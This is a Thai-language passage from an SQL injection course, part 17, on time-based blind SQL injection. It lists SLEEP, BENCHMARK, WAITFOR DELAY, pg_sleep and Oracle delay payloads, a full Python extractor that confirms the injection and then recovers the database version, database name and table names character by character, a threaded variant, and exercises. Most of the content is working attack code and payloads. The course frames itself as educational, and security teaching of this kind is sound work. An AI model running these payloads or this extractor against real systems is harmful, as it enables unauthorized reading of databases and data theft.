# Part 017: Time-Based Blind SQL Injection

## ภาพรวม

Time-based blind SQL injection ใช้เมื่อ application ไม่แสดง error messages และ response ดูเหมือนเหมือนกันโดยสมบูรณ์ เทคนิคนี้ใช้ time delay เพื่อส่ง signal

**ขั้นตอนที่ 189-205**

---

## 189. หลักการ Time-Based Blind

```
ปกติ: Response time ~ 100ms

Condition true → SLEEP(5) → Response time ~ 5100ms
Condition false → ไม่ sleep → Response time ~ 100ms
```

---

## 190. MySQL Time-Based Functions

### 90.1 SLEEP()

```sql
-- Payloads
1 AND SLEEP(5)-- -
1' AND SLEEP(5)-- -
1 OR SLEEP(5)-- -

-- conditional sleep
1 AND IF(1=1, SLEEP(5), 0)-- -
1 AND IF(1=2, SLEEP(5), 0)-- -

-- ใช้เพื่อดึงข้อมูล
1 AND IF(database()='testdb', SLEEP(5), 0)-- -
1 AND IF(SUBSTRING(database(),1,1)='t', SLEEP(5), 0)-- -
```

### 90.2 BENCHMARK()

```sql
SELECT BENCHMARK(5000000, MD5('test'));
1 AND BENCHMARK(5000000, MD5('test'))-- -
1 AND IF(1=1, BENCHMARK(5000000, SHA1('test')), 0)-- -
```

---

## 191. MSSQL Time-Based Functions

```sql
-- WAITFOR DELAY
WAITFOR DELAY '0:0:5';

-- Payloads
1; WAITFOR DELAY '0:0:5'-- -
1'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
1'; IF (DB_NAME()='master') WAITFOR DELAY '0:0:5'-- -
1'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))>64) WAITFOR DELAY '0:0:5'-- -
```

---

## 192. PostgreSQL Time-Based Functions

```sql
-- pg_sleep
1; SELECT pg_sleep(5)-- -
1 AND (SELECT 1 FROM pg_sleep(5)) IS NOT NULL-- -

-- conditional
1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
1'; SELECT CASE WHEN (ASCII(SUBSTRING(current_database(),1,1))>64) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
```

---

## 193. Oracle Time-Based Techniques

```sql
-- DBMS_PIPE (ต้องการ privileges พิเศษ)
SELECT dbms_pipe.receive_message('a',5) FROM dual;

-- Heavy Query (ไม่ต้องการ sleep function)
1 AND 1=(SELECT COUNT(*) FROM all_objects WHERE object_type='TABLE')
```

---

## 194. Python Script สำหรับ Time-Based Extraction

```python
#!/usr/bin/env python3
"""
Time-Based Blind SQL Injection Extractor
สำหรับการศึกษาเท่านั้น
"""

import requests
import time
import statistics
from typing import Optional, Tuple

class TimeBasedExtractor:
    def __init__(self, url: str, param: str, delay: float = 5.0,
                 threshold_multiplier: float = 0.7, cookies: dict = None):
        self.url = url
        self.param = param
        self.delay = delay
        self.threshold = delay * threshold_multiplier
        self.session = requests.Session()
        if cookies:
            self.session.cookies.update(cookies)
        self.requests_count = 0
        self.baseline_times = []
    
    def calibrate(self, num_samples: int = 5):
        print("[*] Calibrating baseline response time...")
        for i in range(num_samples):
            start = time.time()
            try:
                r = self.session.get(self.url, params={self.param: "1"}, timeout=30)
                elapsed = time.time() - start
                self.baseline_times.append(elapsed)
            except:
                pass
        
        if self.baseline_times:
            avg = statistics.mean(self.baseline_times)
            std = statistics.stdev(self.baseline_times) if len(self.baseline_times) > 1 else 0
            print(f"[+] Baseline: avg={avg:.3f}s, std={std:.3f}s")
            self.threshold = max(self.threshold, avg + self.delay * 0.5)
    
    def is_sleep(self, elapsed: float) -> bool:
        return elapsed >= self.threshold
    
    def send_payload(self, payload: str) -> Tuple[bool, float]:
        params = {self.param: payload}
        start = time.time()
        try:
            r = self.session.get(self.url, params=params, timeout=self.delay + 15)
            elapsed = time.time() - start
            self.requests_count += 1
            return self.is_sleep(elapsed), elapsed
        except requests.Timeout:
            elapsed = time.time() - start
            self.requests_count += 1
            return True, elapsed
        except Exception:
            return False, 0
    
    def test_injection(self) -> bool:
        print("[*] Testing for time-based SQL injection...")
        payload_true = f"1 AND SLEEP({self.delay})-- -"
        delayed, elapsed = self.send_payload(payload_true)
        print(f"    True condition: {elapsed:.2f}s {'(DELAYED!)' if delayed else '(not delayed)'}")
        
        payload_false = "1 AND SLEEP(0)-- -"
        not_delayed, elapsed = self.send_payload(payload_false)
        print(f"    False condition: {elapsed:.2f}s {'(not delayed)' if not not_delayed else '(DELAYED!)'}")
        
        if delayed and not not_delayed:
            print("[+] Time-based SQL injection confirmed!")
            return True
        return False
    
    def conditional_sleep(self, condition: str) -> bool:
        payload = f"1 AND IF({condition}, SLEEP({self.delay}), 0)-- -"
        delayed, elapsed = self.send_payload(payload)
        return delayed
    
    def extract_char_binary(self, query: str, position: int) -> Optional[str]:
        lo, hi = 32, 126
        
        while lo <= hi:
            mid = (lo + hi) // 2
            condition = f"ASCII(SUBSTRING(({query}),{position},1)) > {mid}"
            
            if self.conditional_sleep(condition):
                lo = mid + 1
            else:
                condition_eq = f"ASCII(SUBSTRING(({query}),{position},1)) = {mid}"
                if self.conditional_sleep(condition_eq):
                    return chr(mid)
                hi = mid - 1
        
        condition_null = f"ASCII(SUBSTRING(({query}),{position},1)) = 0"
        if self.conditional_sleep(condition_null):
            return None
        
        return chr(lo) if lo <= 126 else None
    
    def extract_length(self, query: str) -> int:
        lo, hi = 0, 200
        
        while lo < hi:
            mid = (lo + hi + 1) // 2
            condition = f"LENGTH(({query})) >= {mid}"
            
            if self.conditional_sleep(condition):
                lo = mid
            else:
                hi = mid - 1
        
        return lo
    
    def extract_string(self, query: str, label: str = "") -> str:
        length = self.extract_length(query)
        
        if length == 0:
            return ""
        
        print(f"    String length: {length}")
        result = ""
        
        for i in range(1, length + 1):
            char = self.extract_char_binary(query, i)
            if char is None:
                break
            result += char
            print(f"\r    [{label}] Extracting: {result}{'_' * (length - i)}", end='', flush=True)
        
        print()
        return result
    
    def get_version(self) -> str:
        print("[*] Extracting version...")
        return self.extract_string("SELECT version()", "version")
    
    def get_database(self) -> str:
        print("[*] Extracting current database...")
        return self.extract_string("SELECT database()", "database")
    
    def enumerate_tables(self, database: str = None) -> list:
        if database:
            count_q = f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{database}'"
        else:
            count_q = "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()"
        
        count_str = self.extract_string(count_q)
        count = int(count_str) if count_str.isdigit() else 0
        tables = []
        
        print(f"\n[*] Enumerating {count} tables...")
        
        for i in range(count):
            if database:
                tq = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT {i},1"
            else:
                tq = f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {i},1"
            table = self.extract_string(tq, f"table[{i}]")
            if table:
                tables.append(table)
                print(f"[+] Table: {table}")
        
        return tables
    
    def print_stats(self):
        print(f"\n[*] Total HTTP requests made: {self.requests_count}")


if __name__ == "__main__":
    extractor = TimeBasedExtractor(
        url="http://example.com/items",
        param="id",
        delay=3,
    )
    
    extractor.calibrate()
    
    if extractor.test_injection():
        print("\n[*] Starting extraction...")
        print(f"[+] Version: {extractor.get_version()}")
        print(f"[+] Database: {extractor.get_database()}")
        print(f"[+] Tables: {extractor.enumerate_tables()}")
    
    extractor.print_stats()
```

---

## 195. Parallel Extraction

```python
import concurrent.futures
import threading

class FastTimeExtractor(TimeBasedExtractor):
    def __init__(self, *args, max_workers=5, **kwargs):
        super().__init__(*args, **kwargs)
        self.max_workers = max_workers
        self._lock = threading.Lock()
    
    def extract_all_chars_parallel(self, query: str, length: int) -> str:
        chars = [''] * length
        
        def extract_position(i):
            char = self.extract_char_binary(query, i + 1)
            chars[i] = char or ''
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(extract_position, i) for i in range(length)]
            concurrent.futures.wait(futures)
        
        return ''.join(chars)
```

---

## 196. แบบฝึกหัด

1. ทดสอบ time-based payloads:
   ```
   1 AND SLEEP(5)
   1' AND SLEEP(5)--
   1 AND IF(1=1,SLEEP(5),0)
   1 AND IF(1=2,SLEEP(5),0)
   ```
2. วัดเวลา response
3. ดึง database name ด้วย manual time-based:
   - `1 AND IF(LENGTH(database())=6,SLEEP(3),0)`

---

## สรุป

Time-based blind SQL Injection:

1. **ใช้เมื่อ** - ไม่มี visible output และ boolean detection ไม่ได้ผล
2. **SLEEP / WAITFOR** - functions หลักที่ใช้
3. **Binary Search** - ลด requests ต่อ character จาก 128 เป็น 7-8
4. **ช้า** - ต้องการ requests มากและรอนาน

---

*Part 017 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
